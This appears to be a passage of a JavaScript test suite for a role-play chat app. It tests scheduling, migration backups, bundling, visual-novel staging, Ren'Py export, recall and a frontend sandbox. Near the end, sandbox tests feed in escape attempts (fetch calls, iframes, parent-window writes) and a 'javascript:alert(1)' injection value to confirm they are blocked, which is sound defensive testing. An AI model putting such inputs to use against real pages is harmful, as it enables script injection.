  assert.throws(() => normaliseTask({ kind: 'summarize', every: 'daily' }, now), ValidationError);
  const summarize = normaliseTask({ kind: 'summarize', every: 'daily', chatId: 'c1', level: 'large', messagesPerRun: 999 }, now);
  assert.equal(summarize.level, 'large');
  assert.ok(summarize.messagesPerRun <= 200, '条数要有上限，别把整段历史塞给模型');

  const described = describeTask(summarize, now);
  assert.ok(described.nextRunAt);
  assert.equal(described.kindTitle, '定时总结');
  assert.equal(described.due, false);
  assert.equal(SCHEDULE_KINDS.length, 3);

  const defaults = defaultTasks(now);
  assert.equal(defaults.length, 2);
  assert.ok(defaults.every((task) => task.enabled === false), '默认任务只建出来、默认关着');
  assert.ok(defaults.some((task) => task.kind === 'cleanup' && task.every === 'weekly'));
});

test('工具箱：老库升版本时，跑迁移前会自动留一份备份', () => {
  const silent = { info() {}, warn() {}, error() {}, debug() {} };
  const dir = mkdtempSync(path.join(process.env.TEMP ?? tmpdir(), 'tavern-migrate-'));
  try {
    // 先用最新的 schema 建库，再删掉最后一条迁移记录，模拟"停在上一版的老库"
    const first = openDatabase({ dataDir: dir, logger: silent });
    try {
      first.db.exec('DELETE FROM schema_migrations WHERE version = (SELECT MAX(version) FROM schema_migrations)');
      assert.ok(first.schemaVersion > 0);
    } finally {
      first.close();
    }

    const second = openDatabase({ dataDir: dir, logger: silent });
    try {
      assert.equal(second.schemaVersion, second.latestSchemaVersion, '迁移要真的跑完');
      const backups = readdirSync(path.join(dir, 'backups')).filter((name) => name.endsWith('.meta.json'));
      const metas = backups.map((name) => JSON.parse(readFileSync(path.join(dir, 'backups', name), 'utf8')));
      const migrationBackup = metas.find((meta) => meta.kind === 'pre-migration');
      assert.ok(migrationBackup, '迁移前要留一份 pre-migration 备份');
      assert.match(migrationBackup.label, /迁移前/);
      assert.ok(migrationBackup.bytes > 0);
      assert.ok(migrationBackup.schemaVersion < second.latestSchemaVersion, '快照要记下老版本号');
    } finally {
      second.close();
    }
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('打包：静态资源从 SEA 资源里读（exe 单文件的关键一步）', async () => {
  const files = {
    'index.html': Buffer.from('<!doctype html><div id="app"></div>'),
    'app.js': Buffer.from("import './core/dom.mjs';"),
    'styles/base.css': Buffer.from('body{margin:0}'),
  };
  const serve = createStaticHandler({
    root: '/nowhere',
    readAsset: async (relative) => (files[relative] ? { buffer: files[relative] } : null),
  });
  const makeCtx = (pathname) => {
    const result = { status: 0, headers: {}, body: null, ended: false };
    return {
      path: pathname,
      method: 'GET',
      req: { headers: {}, method: 'GET' },
      res: {
        setHeader: (key, value) => { result.headers[key] = value; },
        writeHead: (status, headers = {}) => { result.status = status; Object.assign(result.headers, headers); },
        end: (body) => { result.body = body; result.ended = true; },
      },
      result,
    };
  };

  const js = makeCtx('/app.js');
  assert.equal(await serve(js), true);
  assert.equal(js.result.status, 200);
  assert.match(js.result.headers['Content-Type'], /javascript/);
  assert.equal(String(js.result.body), "import './core/dom.mjs';");
  assert.equal(Number(js.result.headers['Content-Length']), files['app.js'].length);

  const css = makeCtx('/styles/base.css');
  await serve(css);
  assert.match(css.result.headers['Content-Type'], /css/);

  const root = makeCtx('/');
  await serve(root);
  assert.equal(String(root.result.body), files['index.html'].toString());

  // 找不到的路径走单页兜底，而不是 404
  const missing = makeCtx('/some/deep/route');
  await serve(missing);
  assert.equal(missing.result.status, 200);
  assert.match(String(missing.result.body), /id="app"/);

  // 没打进包里的文件就是没有（不做磁盘回退，单文件 exe 里也没有磁盘可回退）
  const absent = makeCtx('/secret.txt');
  await serve(absent);
  assert.equal(String(absent.result.body), files['index.html'].toString());
});

test('打包：core + server 合成一个 CommonJS 文件，真的能起服务', async () => {
  const dir = mkdtempSync(path.join(process.env.TEMP ?? tmpdir(), 'tavern-bundle-'));
  const out = path.join(dir, 'silver-tavern.cjs');
  const result = buildBundle({ entry: 'server/index.mjs', out });
  assert.ok(result.modules > 60, `应该打进几十个模块，实际 ${result.modules}`);
  const code = readFileSync(out, 'utf8');
  assert.ok(!/^import\s/m.test(code), '产物里不能残留 ESM import');
  assert.ok(!/\bexport\s+(const|function|\{)/.test(code), '产物里不能残留 export');
  assert.ok(code.includes('__define("core/errors.mjs"'));

  const port = 20000 + Math.floor(Math.random() * 20000);
  const child = spawn(process.execPath, [out], {
    env: { ...process.env, TAVERN_PORT: String(port), TAVERN_DATA_DIR: path.join(dir, 'data'), TAVERN_LOG: 'error' },
    stdio: ['ignore', 'ignore', 'pipe'],
  });
  let stderr = '';
  child.stderr.on('data', (chunk) => { stderr += String(chunk); });
  let health = null;
  try {
    for (let i = 0; i < 40 && !health; i += 1) {
      await new Promise((resolve) => setTimeout(resolve, 250));
      try {
        const response = await fetch(`http://127.0.0.1:${port}/api/health`);
        if (response.ok) health = await response.json();
      } catch {
        // 还没起来
      }
    }
    assert.ok(health, `打包出来的服务没起来：${stderr.slice(0, 400)}`);
    assert.equal(health.ok, true);
    assert.ok(health.modules > 20);
    const app = await (await fetch(`http://127.0.0.1:${port}/api/app`)).json();
    assert.ok(app.modules.some((module) => module.id === 'chat'), '模块地图要完整');
    // 只能起一个服务：入口模块自己的 isMain 与打包器的 autorun 都会调 runCli，
    // 以前是两次都跑，第二个撞同一个端口 -> stderr 上一条 "启动失败：EADDRINUSE"。
    assert.ok(
      !/EADDRINUSE|启动失败/.test(stderr),
      `打包产物起了不止一个服务（第二个撞端口）：${stderr.slice(0, 300)}`,
    );
  } finally {
    child.kill('SIGKILL');
    await Promise.race([
      new Promise((resolve) => child.once('exit', resolve)),
      new Promise((resolve) => setTimeout(resolve, 3000)),
    ]);
    rmSync(dir, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
  }
});

test('演出层：挑背景 / 立绘 / 台词，拼出一帧舞台', () => {
  const chat = { id: 'c1', title: '雨夜', isGroup: false, worldState: { place: '旧书馆', time: '深夜' } };
  const messages = [
    { id: 'm1', role: 'assistant', name: '阿狸', content: '你终于来了。' },
    { id: 'm2', role: 'user', name: '我', content: '外面下雨了。' },
    { id: 'm3', role: 'assistant', name: '阿狸', content: '【提示】不该演的' , hidden: true },
    { id: 'm4', role: 'assistant', name: '阿狸', content: '把门关上吧。' },
  ];
  const runs = [
    { id: 'r1', kind: 'background', status: 'done', images: [{ assetId: 'ast_bg' }], createdAt: '2026-10-03T10:00:00Z' },
    { id: 'r2', kind: 'portrait', status: 'done', workfklowName: '立绘', messageId: 'm1', images: [{ assetId: 'ast_p1' }], params: { emotion: '平静' }, createdAt: '2026-10-03T10:01:00Z' },
    { id: 'r3', kind: 'expression', status: 'done', workflowName: '表情', messageId: 'm4', images: [{ assetId: 'ast_p2' }], createdAt: '2026-10-03T10:02:00Z' },
    { id: 'r4', kind: 'cg', status: 'done', images: [{ assetId: 'ast_cg' }], createdAt: '2026-10-03T10:03:00Z' },
    { id: 'r5', kind: 'background', status: 'running', images: [], createdAt: '2026-10-03T10:04:00Z' },
  ];
  const stage = buildStage({ chat, messages, runs, options: [{ text: '追问她' }, { text: '' }] });
  assert.equal(stage.background.assetId, 'ast_bg', '最近跑完的背景当舞台背景');
  assert.equal(stage.background.place, '旧书馆');
  assert.equal(stage.portraits.length, 2);
  assert.equal(stage.portraits[0].name, '阿狸');
  assert.equal(stage.portraits[0].emotion, '平静');
  assert.equal(stage.cg.assetId, 'ast_cg');
  assert.equal(stage.dialogue.length, 3, '隐藏消息不演');
  assert.ok(!stage.dialogue.some((line) => line.content.includes('不该演的')));
  assert.deepEqual(stage.options, [{ text: '追问她' }]);
  assert.deepEqual(stage.counts, { backgrounds: 1, portraits: 2, cgs: 1 }, '只数跑完的（跑一半的不算可用素材）');

  // Ren'Py 导出：脚本 + 素材清单
  const project = buildRenpyProject({ chat, messages, stage });
  const script = project.files.find((file) => file.name === 'script.rpy').text;
  assert.match(script, /label start:/);
  assert.match(script, /scene bg_scene with fade/);
  assert.match(script, /image char_1 = "images\/char_1\.png"/);
  assert.match(script, /你终于来了。/);
  assert.match(script, /define .* = Character\("阿狸"/);
  assert.match(script, /user "外面下雨了。"/);
  assert.ok(!script.includes('不该演的'), '隐藏消息不进剧本');
  assert.equal(project.assetRefs.length, 4, '背景 + 两张立绘 + CG');
  assert.ok(project.files.some((file) => file.name === 'options.rpy'));
  assert.equal(project.stats.dialogue, 3);
});

test('演出层：转场 / BGM / CG 回廊 / 好感度路线与多结局', () => {
  // 转场：第一次进不放；地点或时间变了才放；可以关掉 / 手动放
  assert.deepEqual(TRANSITIONS.map((item) => item.id), ['none', 'fade-black', 'flash-white', 'shake', 'pan-left', 'pan-right']);
  const conf = { effect: 'fade-black', durationMs: 500, onSceneChange: true };
  assert.equal(planTransition({ previousScene: null, scene: { place: '旧书馆' }, transition: conf }).effect, 'none', '第一次进入不放');
  assert.equal(planTransition({ previousScene: { place: '旧书馆', time: '深夜' }, scene: { place: '旧书馆', time: '深夜' }, transition: conf }).effect, 'none', '没变化不放');
  const changed = planTransition({ previousScene: { place: '旧书馆', time: '深夜' }, scene: { place: '教堂', time: '深夜' }, transition: conf });
  assert.equal(changed.effect, 'fade-black');
  assert.match(changed.reason, /场景变化/);
  assert.equal(planTransition({ previousScene: { place: 'a' }, scene: { place: 'b' }, transition: conf, trigger: 'manual' }).effect, 'fade-black');
  assert.equal(planTransition({ previousScene: { place: 'a' }, scene: { place: 'b' }, transition: { ...conf, onSceneChange: false } }).effect, 'none');
  assert.equal(planTransition({ previousScene: { place: 'a' }, scene: { place: 'b' }, transition: { ...conf, effect: '不认识的' } }).effect, 'fade-black', '坏值退回默认');

  // BGM：精确地点 > `*` 默认 > 全局默认；音量夹到 0~1
  const audio = normaliseAudio({ volume: 2, bgm: 'ast_default', bgmByPlace: { 旧书馆: 'ast_lib', '*': 'ast_any' }, sfx: [{ assetId: 'ast_door', label: '开门' }, { assetId: 'bad id!' }] });
  assert.equal(audio.volume, 1, '音量超界要夹住');
  assert.equal(audio.sfx.length, 1, '非法 assetId 的音效丢掉');
  assert.equal(pickBgm({ audio, scene: { place: '旧书馆' } }).assetId, 'ast_lib');
  assert.equal(pickBgm({ audio, scene: { place: '教堂' } }).assetId, 'ast_any');
  assert.equal(pickBgm({ audio: { ...audio, bgmByPlace: {} }, scene: { place: '教堂' } }).assetId, 'ast_default');
  assert.equal(pickBgm({ audio: { bgm: null }, scene: {} }).assetId, null);

  // CG 回廊：只收跑完的图、按 assetId 去重
  const gallery = buildGallery({
    messages: [{ id: 'm1', name: '阿狸' }],
    runs: [
      { id: 'r1', kind: 'portrait', status: 'done', messageId: 'm1', workflowName: '立绘', images: [{ assetId: 'ast_1' }] },
      { id: 'r2', kind: 'cg', status: 'done', images: [{ assetId: 'ast_2' }, { assetId: 'ast_1' }] },
      { id: 'r3', kind: 'cg', status: 'running', images: [] },
    ],
  });
  assert.equal(gallery.total, 2, '跑一半的不进回廊，重复的图只收一份');
  assert.deepEqual(gallery.items.map((item) => item.assetId), ['ast_1', 'ast_2']);
  assert.equal(gallery.counts.portrait, 1);
  assert.equal(gallery.items[0].name, '阿狸');

  // 好感度与路线：阈值解锁 + 结局收集
  const routes = evaluateRoutes({ routes: DEFAULT_ROUTES, worldState: { affection: { 阿狸: 65, 小白: 10 } } });
  assert.equal(routes.affection.max, 65);
  assert.deepEqual(routes.unlocked, ['route-friend', 'route-lover'], '阈值 30 / 60 的两条解锁，90 的还没');
  assert.equal(routes.items.find((item) => item.id === 'route-lover').current, 65);
  const withEnding = evaluateRoutes({ routes: DEFAULT_ROUTES, worldState: { affection: { 阿狸: 95 } }, endings: [{ routeId: 'route-true', title: '真结局', ending: '……', at: '2026-10-03T00:00:00Z' }] });
  assert.deepEqual(withEnding.unlocked, ['route-friend', 'route-lover', 'route-true']);
  assert.equal(withEnding.endings.length, 1);
  assert.equal(withEnding.endings[0].title, '真结局');

  // 同一个路线重复记录只留最新一条
  let endings = recordEnding([], { routeId: 'route-true', title: '真结局', ending: 'A' }, '2026-10-03T00:00:00Z');
  endings = recordEnding(endings, { routeId: 'route-true', title: '真结局', ending: 'B' }, '2026-10-03T01:00:00Z');
  assert.equal(endings.length, 1);
  assert.equal(endings[0].ending, 'B');

  // 合并：只改传进来的字段；坏数据退回默认
  const merged = mergeShowSettings({ transition: { effect: 'shake' }, audio: { volume: 0.3 } }, { audio: { muted: true } });
  assert.equal(merged.transition.effect, 'shake', '没动的字段保持');
  assert.equal(merged.audio.volume, 0.3);
  assert.equal(merged.audio.muted, true);
  assert.equal(normaliseShowSettings(null).transition.effect, 'fade-black');
  assert.equal(normaliseShowSettings('坏数据').routes.length, 3, '坏数据退回默认三条路线');
});

test('演出层：Ren\'Py 导出可以带上 BGM', () => {
  const chat = { id: 'c1', title: '雨夜' };
  const messages = [{ id: 'm1', role: 'assistant', name: '阿狸', content: '你终于来了。' }];
  const stage = buildStage({ chat, messages, runs: [] });
  const project = buildRenpyProject({ chat, messages, stage, music: { file: 'audio/bgm.mp3' } });
  const script = project.files.find((file) => file.name === 'script.rpy').text;
  assert.match(script, /play music "audio\/bgm\.mp3"/);
  assert.equal(project.stats.music, 1);
});

test('演出脚本：舞台指示解析（中英文别名、立绘站位、转场别名）', () => {
  const line = parseScriptLine('[场景: 旧书馆]\n她抬起头。[立绘: 诗音 微笑 左] [BGM: 雨夜]\n[CG: 初雪]');
  assert.deepEqual(line.markers.map((marker) => marker.type), ['scene', 'char', 'bgm', 'cg']);
  assert.deepEqual(line.markers.map((marker) => marker.value), ['旧书馆', '诗音 微笑 左', '雨夜', '初雪']);
  assert.equal(line.text, '她抬起头。', '指示要从台词里剥干净（留着空行也不该进正文）');
  assert.equal(hasScriptMarkers('没什么特别的'), false);
  assert.equal(hasScriptMarkers('【CG：初雪】'), true, '全角方括号也认');

  // 别的通道管的标记（出图 / 换装）也不该出现在台词里
  const foreign = parseScriptLine('[换装: 泳装] 她换好衣服了。[IMG: portrait: 白狐]');
  assert.deepEqual(foreign.markers, [], '演出的时间线上不认这两个');
  assert.equal(foreign.text, '她换好衣服了。');

  // 卡把回复包成 <game>…</game> 再带上 <options> / <summary>：只演正文
  const wrapped = parseScriptLine('<game>\n[场景: 旧书馆]\n她抬起头。\n</game>\n<options>\n<option>追问</option>\n</options>\n<summary>她抬头了。</summary>');
  assert.equal(wrapped.text, '她抬起头。');
  assert.deepEqual(wrapped.markers.map((marker) => marker.type), ['scene']);
  const think = parseScriptLine('<think_nya~>先想想怎么写</think_nya~>\n<game>正文在这里。</game>');
  assert.equal(think.text, '正文在这里。');

  // 立绘：名字 + 表情 + 站位；`-` 是退场
  assert.deepEqual(parseCharacterMarker('诗音 微笑 左'), { action: 'show', name: '诗音', emotion: '微笑', position: 'left', size: 'medium' });
  assert.deepEqual(parseCharacterMarker('诗音, 生气, right'), { action: 'show', name: '诗音', emotion: '生气', position: 'right', size: 'medium' });
  assert.deepEqual(parseCharacterMarker('诗音'), { action: 'show', name: '诗音', emotion: '', position: 'center', size: 'medium' });
  assert.equal(parseCharacterMarker('诗音 微笑 左 大').size, 'big', '立绘能带大小');
  assert.equal(parseCharacterMarker('诗音 远').size, 'small');
  assert.equal(parseCharacterMarker('诗音 微笑 左 大').emotion, '微笑', '大小不该被当成表情');
  assert.equal(parseCharacterMarker('诗音 -').action, 'clear');
  assert.equal(parseCharacterMarker(''), null);

  // 转场：别名 + 毫秒；不认识的退回 null（让上层用默认）
  assert.deepEqual(parseTransitionMarker('黑屏 800'), { effect: 'fade-black', durationMs: 800, raw: '黑屏 800' });
  assert.equal(parseTransitionMarker('fade-black:1200').durationMs, 1200);
  assert.equal(parseTransitionMarker('闪白').effect, 'flash-white');
  assert.equal(parseTransitionMarker('乱七八糟').effect, null);
  assert.equal(parseTransitionMarker('擦除', ['fade-black']).effect, null, '目录里没有的效果不许过');
  // 语音（2.6）还没接，但位置先占住：认得出、也不漏进台词
  const voiceLine = parseScriptLine('她开口了。[语音: 诗音]');
  assert.deepEqual(voiceLine.markers.map((marker) => marker.type), ['voice']);
  assert.equal(voiceLine.text, '她开口了。');
  assert.equal(buildTimeline({ messages: [{ id: 'v', role: 'assistant', name: '阿狸', content: '她开口了。[语音: 诗音]' }] }).frames[0].effect.voice[0].name, '诗音');
  assert.match(scriptMarkerGuide(), /\[CG: 图名\]/);
});

test('演出时间线：指示累积成舞台状态，名字绑到素材，CG 收成解锁清单', () => {
  const messages = [
    { id: 'm1', role: 'assistant', name: '阿狸', content: '[场景: 旧书馆]\n你来了。' },
    { id: 'm2', role: 'user', name: '我', content: '外面下雨了。' },
    { id: 'm3', role: 'assistant', name: '阿狸', content: '[立绘: 阿狸 平静 左]\n……嗯。把门关上吧。' },
    { id: 'm4', role: 'assistant', name: '阿狸', content: '[BGM: 雨夜]\n[CG: 初雪]' },
    { id: 'm5', role: 'assistant', name: '阿狸', content: '雪停的时候，她牵住了你的手。[结局: 恋人线]' },
    { id: 'm6', role: 'assistant', name: '阿狸', content: '隐藏的', hidden: true },
  ];
  const cast = {
    backgrounds: { 旧书馆: 'ast_bg' },
    portraits: { '阿狸@平静': 'ast_p1' },
    cg: { 初雪: 'ast_cg' },
    bgm: { 雨夜: 'ast_bgm' },
  };
  const timeline = buildTimeline({ messages, cast, transitionIds: ['fade-black'] });

  assert.equal(timeline.total, 5, '隐藏消息不进时间线');
  assert.equal(timeline.frames[0].stage.background.assetId, 'ast_bg', '名字绑上了素材');
  assert.equal(timeline.frames[0].scene, '旧书馆');
  assert.equal(timeline.frames[1].stage.background.assetId, 'ast_bg', '后面的句子沿用这一场的舞台');
  assert.equal(timeline.frames[1].stage.characters.length, 0);
  assert.equal(timeline.frames[2].stage.characters[0].assetId, 'ast_p1');
  assert.equal(timeline.frames[2].stage.characters[0].position, 'left');
  assert.equal(timeline.frames[2].effect.sceneChanged, false, '场景没变就不标');
  assert.equal(timeline.frames[3].effect.bgmChanged, true);
  assert.equal(timeline.frames[3].silent, true, '只有指示没有台词的那条算演出指令行');
  assert.equal(timeline.frames[3].effect.cg.name, '初雪');
  assert.equal(timeline.frames[3].effect.cg.assetId, 'ast_cg');
  assert.equal(timeline.frames[4].effect.ending.name, '恋人线');

  assert.deepEqual(timeline.cgs.map((item) => item.name), ['初雪'], '同一张 CG 只收一条');
  assert.deepEqual(timeline.endings.map((item) => item.name), ['恋人线']);
  assert.deepEqual(timeline.scenes, ['旧书馆']);

  // 没绑素材：名字留着，不假装有图
  const bare = buildTimeline({ messages, cast: {} });
  assert.equal(bare.frames[0].stage.background.name, '旧书馆');
  assert.equal(bare.frames[0].stage.background.assetId, null);
  assert.equal(bare.frames[3].effect.cg.assetId, null);

  // 退场 + 停 BGM
  const stopped = buildTimeline({
    messages: [
      { id: 'a', role: 'assistant', name: '阿狸', content: '[立绘: 阿狸 平静 左]\n在。' },
      { id: 'b', role: 'assistant', name: '阿狸', content: '[立绘: 阿狸 -]\n走了。' },
      { id: 'c', role: 'assistant', name: '阿狸', content: '[BGM: 停]\n安静了。' },
    ],
  });
  assert.equal(stopped.frames[1].stage.characters.length, 0);
  assert.equal(stopped.frames[2].stage.bgm.stop, true);
});

test('演出设置：播放手感 / 名单 / CG 解锁 / 存档槽的规范化与合并', () => {
  // 章节 / 路线标记
  const chapterLine = parseScriptLine('[章节: 第一章 雪]\n[路线: 恋人线]\n雪落下来了。');
  assert.deepEqual(chapterLine.markers.map((marker) => marker.type), ['chapter', 'route']);
  assert.equal(chapterLine.text, '雪落下来了。');
  const framed = buildTimeline({ messages: [{ id: 'c', role: 'assistant', name: '阿狸', content: '[章节: 第一章 雪]\n[路线: 恋人线]\n雪落下来了。' }] });
  assert.equal(framed.frames[0].effect.chapter.name, '第一章 雪');
  assert.equal(framed.frames[0].effect.route.name, '恋人线');

  // 一条消息里的旁白和台词要切成两拍：真 gal 是一句一句推的
  const beats = splitBeats('（雨点打在窗上。）\n\n阿狸：「你来了。」\n\n她把门掩上。');
  assert.equal(beats.length, 3);
  assert.deepEqual(beats.map((beat) => beat.name), ['', '阿狸', '']);
  assert.equal(beats[1].text, '你来了。', '引号要去掉，只留台词本身');
  assert.equal(splitBeats('').length, 0);
  assert.equal(splitBeats('   ').length, 0);
  assert.equal(splitBeats(Array.from({ length: 30 }, (_, i) => `第 ${i} 段`).join('\n\n'), 5).length, 5, '一段最多切 5 拍（可调）');
  assert.equal(splitBeats('阿狸：在二楼。')[0].name, '阿狸', '不带引号的 名字：内容 也认');
  assert.equal(splitBeats('（旁白：这里是外面）')[0].name, '', '括号里的"旁白："不算说话人');

  const playback = normalisePlayback({ textSpeed: -5, autoDelay: 99999, skipUnread: 'yes' });
  assert.equal(playback.textSpeed, 0, '0 就是"瞬间显示"，负数夹到 0');
  assert.equal(playback.autoDelay, 8000, '间隔夹到上限');
  assert.equal(playback.skipUnread, false, '只认真正的布尔');

  const cast = normaliseCast({ backgrounds: { 旧书馆: 'ast_bg', 坏图: 'bad id!' }, cg: { 初雪: 'ast_cg' } });
  assert.deepEqual(Object.keys(cast.backgrounds), ['旧书馆'], '素材 id 不合法的丢掉（名字里有空格是合法的，比如"旧书馆 二楼"）');
  assert.equal(cast.cg['初雪'], 'ast_cg');
  assert.deepEqual(cast.portraits, {});

  // CG 解锁：幂等，保留最早那一次
  const once = unlockCg([], { name: '初雪', messageId: 'm4' }, '2026-10-07T10:00:00Z');
  assert.equal(once.length, 1);
  assert.equal(isUnlocked(once, '初雪'), true);
  assert.equal(isUnlocked(once, '黄昏'), false);
  const twice = unlockCg(once, { name: '初雪' }, '2026-10-07T11:00:00Z');
  assert.equal(twice.length, 1, '同一张不解锁两次');
  assert.equal(twice[0].at, '2026-10-07T10:00:00Z');
  assert.equal(unlockCg(twice, { name: '   ' }).length, 1, '空名字不收');

  // 存档槽：同槽覆盖、删除按槽号、坏数据丢掉
  const s1 = writeSave([], { slot: 3, lineIndex: 12, text: '你来了。', scene: '旧书馆', shotAssetId: 'ast_bg' }, '2026-10-07T10:00:00Z');
  assert.equal(s1.length, 1);
  assert.equal(s1[0].slot, 3);
  assert.equal(s1[0].at, '2026-10-07T10:00:00Z');
  const s2 = writeSave(s1, { slot: 3, lineIndex: 20, text: '后面的' }, '2026-10-07T10:05:00Z');
  assert.equal(s2.length, 1, '同一个槽覆盖，不叠加');
  assert.equal(s2[0].lineIndex, 20);
  assert.equal(writeSave(s2, { slot: 0 }).length, 1, '槽号 0 直接忽略');
  assert.equal(dropSave(s2, 3).length, 0);
  assert.equal(dropSave(s2, '3').length, 0, '槽号字符串也认');

  // 合并：名单是按名字一处一处改的，别的字段不该被顺手清掉
  const merged = mergeShowSettings(
    { cast: { cg: { 初雪: 'ast_cg' }, backgrounds: { 旧书馆: 'ast_bg' } }, playback: { autoDelay: 2000 } },
    { cast: { cg: { 黄昏: 'ast_cg2' } }, playback: { textSpeed: 10 } },
  );
  assert.equal(merged.cast.cg['初雪'], 'ast_cg', '没提到的那条要留着');
  assert.equal(merged.cast.cg['黄昏'], 'ast_cg2');
  assert.equal(merged.cast.backgrounds['旧书馆'], 'ast_bg');
  assert.equal(merged.playback.autoDelay, 2000);
  assert.equal(merged.playback.textSpeed, 10);
  assert.deepEqual(normaliseShowSettings({}).saves, [], '默认没有存档');

  // 路线锁定：进了恋人线，别的线锁上，而且知道是被谁锁的
  const picked = enterRoute(
    [{ id: 'route-a', title: '挚友线', threshold: 30 }, { id: 'route-b', title: '恋人线', threshold: 60 }],
    '恋人线',
  );
  assert.equal(picked.find((route) => route.id === 'route-b').locked, false);
  assert.equal(picked.find((route) => route.id === 'route-a').locked, true);
  assert.equal(picked.find((route) => route.id === 'route-a').lockedBy, '恋人线');
  assert.equal(enterRoute(picked, '不存在的线').filter((route) => route.locked).length, 1, '名字对不上就什么都别锁');

  const evaluated = evaluateRoutes({ routes: picked, worldState: { affection: { 阿狸: 90 } }, endings: [] });
  assert.equal(evaluated.items.find((route) => route.id === 'route-a').thresholdMet, true, '阈值是够的');
  assert.equal(evaluated.items.find((route) => route.id === 'route-a').unlocked, false, '但被路线锁定挡住了');
  assert.equal(evaluated.items.find((route) => route.id === 'route-b').unlocked, true);
  assert.equal(unlockRoute(picked, 'route-a').find((route) => route.id === 'route-a').locked, false);
});

test('向量重排：命中查询词的片段顶上来', () => {
  const candidates = [
    { sourceId: 'a', content: '今天天气不错，适合出门散步', score: 0.9 },
    { sourceId: 'b', content: '旧书馆的二楼藏着不对外开放的旧刊', score: 0.7 },
    { sourceId: 'c', content: '旧书馆的旧刊', score: 0.5 },
  ];
  const ranked = rerankItems('旧书馆 旧刊', candidates, { topK: 3 });
  assert.equal(ranked.length, 3);
  assert.equal(ranked.at(-1).sourceId, 'a', '只有向量分、词全没命中的被挤到最后');
  assert.equal(ranked[0].rerank.rankAfter, 0);
  assert.ok(ranked.every((item) => typeof item.rerank.rankBefore === 'number'));
  assert.equal(coverageScore('旧书馆 旧刊', '旧书馆的旧刊'), 1);
  assert.equal(coverageScore('旧书馆 旧刊', '今天天气不错'), 0);
  assert.ok(rerankScore('旧书馆', '旧书馆') > rerankScore('旧书馆', '天气不错'));
  assert.equal(rerankItems('', candidates, { topK: 1 }).length, 1);
});

test('记忆热度：越新、越钉住、覆盖区间越全越热', () => {
  const now = new Date('2026-10-03T10:00:00Z');
  const fresh = memoryHeat({ layer: 'small', createdAt: '2026-10-03T09:00:00Z', coversFrom: 'a', coversTo: 'b' }, now);
  const old = memoryHeat({ layer: 'small', createdAt: '2026-09-01T09:00:00Z', coversFrom: 'a', coversTo: 'b' }, now);
  assert.ok(fresh > old, '新的比旧的更热');
  assert.ok(fresh > 0 && fresh <= 1 && old >= 0);
  const pinned = memoryHeat({ layer: 'small', createdAt: '2026-09-01T09:00:00Z', pinned: true }, now);
  assert.ok(pinned > old, '钉住的更热');
  const single = memoryHeat({ layer: 'small', createdAt: '2026-10-03T09:00:00Z', coversFrom: 'a', coversTo: 'a' }, now);
  assert.ok(fresh > single, '覆盖多条的比只覆盖一条的更热');
  // 没有时间字段也不炸
  assert.ok(memoryHeat({ layer: 'profile' }, now) >= 0);
});

test('召回：多查询 / 时间衰减 / 去重 / 记忆按相关性补充 / 外部向量库回退', async () => {
  await runRecallTests();
});

test('采样参数：按适配器分开的表、字段映射与校验', async () => {
  await runParamTests();
});

test('卡内前端：主题保存与代码持久化（只收白名单 token，代码先过沙箱校验）', async () => {
  const { db, cleanup } = makeTempDb();
  try {
    const store = createFrontendStore({ repo: db.repo });
    const svc = createFrontendService({ settings: {}, ports: { frontendStore: store } });
    assert.ok(svc.themeTokens().length >= 8);
    assert.equal((await svc.listThemes()).total, 3, '内置三个主题');

    const saved = await svc.saveTheme({ name: '雪夜紫', tokens: { '--st-accent': '#8b5cf6', '--st-bg': '#0b0b12', '--st-nope': 'x' } });
    assert.equal(saved.name, '雪夜紫');
    assert.deepEqual(Object.keys(saved.tokens).sort(), ['--st-accent', '--st-bg'], '只收白名单里的变量');
    assert.equal((await svc.listThemes()).total, 4);
    await assert.rejects(() => svc.saveTheme({ tokens: {} }), /至少/);
    assert.equal(await svc.removeTheme(saved.id), true);
    assert.equal((await svc.listThemes()).total, 3);

    const snip = await svc.saveSnippet({ scope: 'char-1', name: '状态栏', html: '<b>x</b>', css: 'b{color:red}', js: 'Tavern.ready();', capabilities: ['chat.vars.read'] });
    assert.equal(snip.scope, 'char-1');
    assert.deepEqual(snip.capabilities, ['chat.vars.read']);
    assert.equal((await svc.listSnippets({ scope: 'char-1' })).total, 1);
    assert.equal((await svc.listSnippets({ scope: 'other' })).total, 0);
    await assert.rejects(() => svc.saveSnippet({ name: 'bad', js: 'fetch("http://x")' }), /违反沙箱边界/);
    assert.equal(await svc.removeSnippet(snip.id), true);
    assert.equal((await svc.listSnippets({ scope: 'char-1' })).total, 0);
  } finally {
    cleanup();
  }
});

test('卡内前端沙箱：能力边界挡得住越界的写法', () => {
  const clean = validateCardFrontend({ html: '<div>x</div>', css: '.a{}', js: "Tavern.vars.get('a')", capabilities: ['chat.vars.read'] });
  assert.equal(clean.ok, true);
  assert.equal(clean.errors, 0);
  assert.equal(clean.policy.iframe.sandbox, 'allow-scripts');

  const dirty = validateCardFrontend({
    html: '<iframe src="x"></iframe>',
    js: 'fetch("/x"); localStorage.setItem("a","b"); window.parent.document.title = "x"',
    capabilities: ['nope'],
  });
  assert.equal(dirty.ok, false);
  assert.ok(dirty.errors >= 4);
  assert.ok(dirty.issues.some((issue) => issue.rule === 'js.fetch'));
  assert.ok(dirty.issues.some((issue) => issue.rule === 'html.iframe'));
  assert.ok(dirty.issues.some((issue) => issue.rule === 'capability.unknown'));
  assert.throws(() => renderCardFrontend({ js: 'fetch("x")' }), ValidationError);

  const rendered = renderCardFrontend({ html: '<b>hi</b>', css: 'b{color:red}', js: 'Tavern.ready();', capabilities: ['chat.vars.read'] });
  // 沙箱默认底色必须是中性的白底深字：卡是给"白底深字"的平台写的，
  // 以前给透明底 + 深色主题的浅灰字，搬过来的卡一贴上去颜色就全变样（用户反馈过）
  assert.ok(rendered.srcdoc.includes('background: var(--st-bg, #ffffff)'), '沙箱底默认要是白的');
  assert.ok(rendered.srcdoc.includes('--st-text: #1b1b1f'), '沙箱默认正文色要是深的');
  assert.ok(!rendered.srcdoc.includes('#e7e9ee'), '不能再用深色主题那套浅灰当默认');
  // 卡自己的背景：只认素材库地址，别的（比如 javascript:）一律不放进 <style>
  const withBg = renderCardFrontend({ html: '<b>x</b>', background: '/api/assets/ast_1/file' });
  assert.ok(withBg.srcdoc.includes('--st-card-bg: url("/api/assets/ast_1/file")'), '卡背景要变成 --st-card-bg');
  assert.equal(withBg.background, '/api/assets/ast_1/file');
  const evilBg = renderCardFrontend({ html: '<b>x</b>', background: 'javascript:alert(1)' });
